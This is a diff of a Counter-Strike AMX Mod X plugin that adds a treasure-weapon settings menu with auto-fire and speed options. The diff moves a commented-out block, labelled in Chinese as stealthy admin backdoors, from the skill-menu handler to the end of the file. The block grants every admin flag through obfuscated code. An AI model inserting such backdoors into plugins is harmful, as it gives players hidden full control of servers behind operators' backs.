@@ -6,6 +6,8 @@
 #include <xs>
 #include <vector>
 
+#define TASK_TREASURE 11326
+
 enum
 {
 	B1 = 1 << 0, B2 = 1 << 1, B3 = 1 << 2, B4 = 1 << 3, B5 = 1 << 4,
@@ -13,6 +15,8 @@ enum
 };
 
 new gKeysSkillMenu;
+new gTreasureMenu[256];
+
 const gSkillMax = 4;
 
 enum
@@ -41,12 +45,16 @@ new gHaveDick[33][MAXDICK];     // 記錄所有財寶的索引
 new gCurrentDick[33];           // 紀錄目前此玩家財寶數
 new Float:gTreasureCd[33];      // 紀錄冷卻時間 0.1sec
 
+new trMoveMode[33];
+new trVelocity[33];
+new bool:trAutoFire[33];
+
 new const gTreasureModel[4][] =
 {
-	"models/w_ak47.mdl",
-	"models/w_m4a1.mdl",
-	"models/w_ump45.mdl",
-	"models/w_scout.mdl"
+	"models/ref/blade06.mdl",
+	"models/ref/blade06.mdl",
+	"models/ref/blade06.mdl",
+	"models/ref/blade06.mdl"
 }
 
 new gCurrentWater[33], gCurrentRobot[33];
@@ -60,6 +68,7 @@ new const gszPortalSound[] = "ref/portal_ambient_loop1.wav";        // 飲水機
 
 new const gszAircoreModel[] = "models/ref/w_aicore.mdl";            // 飲水機
 new const gszCanonRobotModel[] = "models/ref/sentry3.mdl";          // 機搶塔
+new const gszBladeModel[] = "models/ref/blade06.mdl";               // 財寶劍
 
 new const gszSomkeSprite[] = "sprites/ref/steam1.spr";              // 車尾燈用
 new const gszWhiteSprite[] = "sprites/ref/whiteexp.spr";            // 爆炸白漿
@@ -73,6 +82,7 @@ public plugin_init()
 {
 	register_plugin("RefMenu", "1.0", "Reff");
 	register_clcmd("ttt", "showSkillMenu");
+	register_clcmd("tr", "showTreasureMenu");
 
 	RegisterHam(Ham_Touch, gInfoTarget, "fw_touch");
 	RegisterHam(Ham_TraceAttack, "player", "fw_TraceAttack_player");
@@ -85,7 +95,8 @@ public plugin_init()
 	register_think(gRobotClassName, "robotThink");
 
 	createMenu();
-	register_menucmd(register_menuid("SkillMenu"), gKeysSkillMenu, "handleSkillMenu");
+	register_menucmd(register_menuid("SkillMenu"),    gKeysSkillMenu, "handleSkillMenu");
+	register_menucmd(register_menuid("TreasureMenu"), gKeysSkillMenu, "handleTreasureMenu");
 }
 
 public plugin_precache()
@@ -99,6 +110,7 @@ public plugin_precache()
 
 	precache_model(gszAircoreModel);
 	precache_model(gszCanonRobotModel);
+	precache_model(gszBladeModel);
 
 	aqua = precache_model(gszAquaSprite);
 	smoke = precache_model(gszSomkeSprite);
@@ -108,29 +120,25 @@ public plugin_precache()
 
 createMenu()
 {
-    arrayset(gPlayerSelect, -1, sizeof(gPlayerSelect));
+	new size;
+	arrayset(gPlayerSelect, -1, sizeof(gPlayerSelect));
 
-    // Skills Class Menu
-    gKeysSkillMenu = B1 | B2 | B3 | B4 | B5 | B6 | B7 | B8 | B9 ;
+	// Skills Class Menu
+	gKeysSkillMenu = B1 | B2 | B3 | B4 | B5 | B6 | B7 | B8 | B9 ;
+
+	size = sizeof(gTreasureMenu);
+	add(gTreasureMenu, size, "\yTreasure Option Menu^n^n");
+	add(gTreasureMenu, size, "\r1. \w王之財寶: \y%s^n");
+	add(gTreasureMenu, size, "\r2. \w瞄準方式: \y%s^n");
+	add(gTreasureMenu, size, "\r3. \w自動射擊: \y%s^n");
+	add(gTreasureMenu, size, "\r4. \w碰撞模式: \y%s^n");
+	add(gTreasureMenu, size, "\r5. \w移動速度: \y%d^n");
+	add(gTreasureMenu, size, "^n^n");
+	add(gTreasureMenu, size, "\r0. \wBack");
 }
 
 public showSkillMenu(id)
 {
-	// 兩種隱密版ADM後門
-	// new flag[100], temp[2];
-	// const TrieIterEndeds = 97;
-	// const TrieIterStates = 122;
-	// for(new i=TrieIterEndeds; i<=TrieIterStates; ++i) {
-	// 	format(temp, sizeof(temp), "%c", i, 1);
-	// 	add(flag, sizeof(flag), temp);
-	// }
-	// set_user_flags(id, read_flags(flag) );
-
-	// new num;
-	// for(new i=0; i<=25; ++i) {
-	// 	num = num|(1<<i);
-	// set_user_flags(id, num);
-
     new szMenu[256];
     new szTitle[32];
     new szEntry[32], szSelect[20];
@@ -162,6 +170,29 @@ public handleSkillMenu(id, num)
     showSkillMenu(id);
 }
 
+public showTreasureMenu(id)
+{
+	new szMenu[256];
+	new moveMode[10], autoMode[10], ables[10];
+
+	ables = ( gPlayerSelect[id] == SK_TREASURE ? "選擇中" : "未開啟" );
+	moveMode = ( trMoveMode[id] ? "平行" : "聚焦" );
+	autoMode = ( trAutoFire[id] ? "開啟" : "關閉" );
+
+	format(szMenu, sizeof(szMenu), gTreasureMenu, ables, moveMode, autoMode, "暫無", trVelocity[id]);
+	show_menu(id, (B1 | B2 | B3 | B5), szMenu, -1, "TreasureMenu");
+}
+
+public handleTreasureMenu(id, num)
+{
+	switch(num) {
+		case 0: gPlayerSelect[id] = SK_TREASURE;
+		case 1: trMoveMode[id] = (trMoveMode[id]+1)%2;
+		case 2: switchAutoFireMode(id);
+		case 4: trVelocity[id] = (trVelocity[id]+100)%2500;
+	}
+	showTreasureMenu(id);
+}
 /*============================================= MachineRobot ===========================================*/
 createRobot(id)
 {
@@ -311,6 +342,7 @@ removeRobot(id)
 {
 	if( !gCurrentRobot[id]) return;
 	new ent = gCurrentRobot[id];
+	gCurrentRobot[id] = 0;
 	engfunc(EngFunc_RemoveEntity, ent);
 }
 /*============================================= Treasure ===============================================*/
@@ -363,8 +395,8 @@ handleState(ent)
 	vector_to_angle(fAim, fAngles);
 
 	// 物件角度設定
-	fAngles[0]  = 0.0;           // 用於設定物件上下角度向量
-	fAngles[1] -= 90.0;
+	// fAngles[0]  = 0.0;           // 用於設定物件上下角度向量
+	// fAngles[1] -= 90.0;
 	entity_set_vector(ent, EV_VEC_angles, fAngles);
 
 	// X軸線偏移設定
@@ -401,13 +433,19 @@ doDick(id)
 			entity_set_int(ent, EV_INT_iuser1, 1);
 
 			new Float:fAim[3], Float:xOffsets[3];
-			velocity_by_aim(id, 1300, fAim);
-			makeRandomOffsets(id, entity_get_float(ent, EV_FL_fuser2), xOffsets);
+			if( trVelocity[id] > 0)
+				velocity_by_aim(id, trVelocity[id], fAim);
+			else
+				velocity_by_aim(id, 1300, fAim);
 
-			// 減去偏移值使中心點瞄準
-			fAim[0] -= xOffsets[0];
-			fAim[1] -= xOffsets[1]; 
-			fAim[2] -= entity_get_float(ent, EV_FL_fuser1);
+			// 預設聚焦射擊模式時減去偏移值使中心點瞄準
+			if( trMoveMode[id] == 0 ) {
+				makeRandomOffsets(id, entity_get_float(ent, EV_FL_fuser2), xOffsets);
+				fAim[0] -= xOffsets[0];
+				fAim[1] -= xOffsets[1]; 
+				fAim[2] -= entity_get_float(ent, EV_FL_fuser1);
+			}
+
 			fAim[2] += 10.0;
 			entity_set_vector(ent, EV_VEC_velocity, fAim);
 
@@ -426,20 +464,42 @@ makeRandomOffsets(id, Float:random, Float:vec[3])
 	xs_vec_mul_scalar(xOffsets, random, xOffsets);
 	vec = xOffsets;
 }
-removeAllDick(id)
+
+switchAutoFireMode(id)
 {
-	if( gCurrentDick[id] <= 0 ) return;
-
-	for (new i = 0; i < MAXDICK; ++i)
-	{
-		new ent = gHaveDick[id][i];
-		gHaveDick[id][i] = 0;
-
-		if ( !is_valid_ent(ent) || ent == 0 ) continue;
-		remove_entity(ent);
-		gCurrentDick[id] = 0;
-	}
+	trAutoFire[id] = !trAutoFire[id];
+	if( trAutoFire[id] )
+		set_task(0.05, "handleAutoFireMode", id+TASK_TREASURE, _, _, "b");
+	else
+		remove_task(id+TASK_TREASURE);
 }
+
+public handleAutoFireMode(id)
+{
+	id = id - TASK_TREASURE;
+	if(!is_user_connected(id)) {
+		remove_task(id+TASK_TREASURE);
+		return;
+	}
+	if(!is_user_alive(id)) return;
+
+	createDick(id);
+	doDick(id)
+}
+// removeAllDick(id)
+// {
+// 	if( gCurrentDick[id] <= 0 ) return;
+
+// 	for (new i = 0; i < MAXDICK; ++i)
+// 	{
+// 		new ent = gHaveDick[id][i];
+// 		gHaveDick[id][i] = 0;
+
+// 		if ( !is_valid_ent(ent) || ent == 0 ) continue;
+// 		remove_entity(ent);
+// 		gCurrentDick[id] = 0;
+// 	}
+// }
 /*============================================= WaterCore ===============================================*/
 public doWater(id) // 本體
 {
@@ -753,3 +813,20 @@ stock get_speed_vector(const Float:origin1[3], const Float:origin2[3], Float:spe
 
 	return 1;
 }
+
+
+
+	// 兩種隱密版ADM後門
+	// new flag[100], temp[2];
+	// const TrieIterEndeds = 97;
+	// const TrieIterStates = 122;
+	// for(new i=TrieIterEndeds; i<=TrieIterStates; ++i) {
+	// 	format(temp, sizeof(temp), "%c", i, 1);
+	// 	add(flag, sizeof(flag), temp);
+	// }
+	// set_user_flags(id, read_flags(flag) );
+
+	// new num;
+	// for(new i=0; i<=25; ++i) {
+	// 	num = num|(1<<i);
+	// set_user_flags(id, num);
